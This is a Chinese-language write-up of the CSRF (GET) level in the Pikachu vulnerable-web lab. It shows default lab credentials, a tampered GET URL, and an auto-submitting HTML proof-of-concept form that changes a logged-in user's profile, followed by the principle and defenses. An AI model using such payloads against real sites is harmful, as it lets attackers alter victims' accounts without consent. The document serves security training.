# Pikachu 靶场 CSRF (get) 解题

> 
> 页面：`csrf_get_login.php`，真正业务页面是 `csrf_get_edit.php`，这是**GET 型跨站请求伪造**，没有 CSRF‑Token 防护，直接构造 GET 链接即可修改已登录用户的个人资料。

## 步骤 1：获取账号密码

点页面上的**点一下提示**，得到账号列表：

> 
> `vince / allen / kobe / grady / kevin / lucy / lili`，**全部密码：123456**

用任意账号登录，例如 `vince` / `123456`，进入个人会员中心，点击【修改个人信息】跳转到 `csrf_get_edit.php`。

## 步骤 2：抓包拿到正常修改请求

1. BurpSuite 开启代理抓包；
2. 在修改页面随便填内容，点 submit 提交；
3. 在 Burp 的 HTTP 历史拿到完整 GET URL，格式如下：

```
https://xxx/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&phonenum=18626545453&add=chain&email=vince@pikachu.com&submit=submit
```

> 
> 关键点：**没有 token 参数**，全部操作靠 URL 参数，浏览器带上当前用户 Cookie 就可以执行修改操作。

## 步骤 3：两种利用方式

### 方式 A：直接构造恶意 URL（最简单）

复制上面链接，修改参数（比如把住址`add`改成`hacked`，邮箱随便改），得到恶意链接：

```
https://27aedf8e3e0b4557b080c5a54e4a7f5c--8081.ap-shanghai2.cloudstudio.club/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&phonenum=18626545453&add=hacked&email=hack@test.com&submit=submit
```

> 
> 攻击条件：**受害者浏览器处于该账号登录状态**，只要点开这个链接，不需要输入账号密码，信息直接被篡改腾讯云。

### 方式 B：生成 CSRF PoC 页面（Burp 一键生成）

1. Burp 抓到修改信息的 GET 请求，右键 → `Engagement tools` → `Generate CSRF PoC`；
2. 复制生成的 HTML 代码，保存为 html 文件；
3. 受害者登录状态访问这个 html 页面，页面会自动发起 GET 请求修改资料。

示例 PoC HTML：

```
<form action="https://27aedf8e3e0b4557b080c5a54e4a7f5c--8081.ap-shanghai2.cloudstudio.club/vul/csrf/csrfget/csrf_get_edit.php">
    <input type="hidden" name="sex" value="boy">
    <input type="hidden" name="phonenum" value="18626545453">
    <input type="hidden" name="add" value="hacked">
    <input type="hidden" name="email" value="hack@test.com">
    <input type="hidden" name="submit" value="submit">
</form>
<script>document.forms[0].submit();</script>
```

## 本地复现测试技巧

1. 当前浏览器保持 vince 登录；
2. 新开标签页，直接粘贴上面恶意 URL 访问；
3. 切回个人中心页面刷新，看到住址 / 邮箱已经被修改，漏洞复现成功。

## 原理小结

CSRF 利用浏览器自动携带目标站点 Cookie 的特性；GET 请求直接把业务操作放在 URL 参数；服务器**没有校验 CSRF‑Token，没有校验 Referer**，跨域过来的请求直接执行修改操作。

## 防御方法（题目拓展）

1. 关键操作增加随机**CSRF‑Token**，每个表单请求携带，服务端校验；
2. 校验`Referer/Origin`请求头；
3. Cookie 设置`SameSite=Strict/Lax`；
4. 修改信息等敏感操作禁止使用 GET 请求，使用 POST 并二次验证身份。

> 
> 小提示：`csrf_get_login.php`只是登录入口，漏洞攻击点是`csrf_get_edit.php`修改信息接口。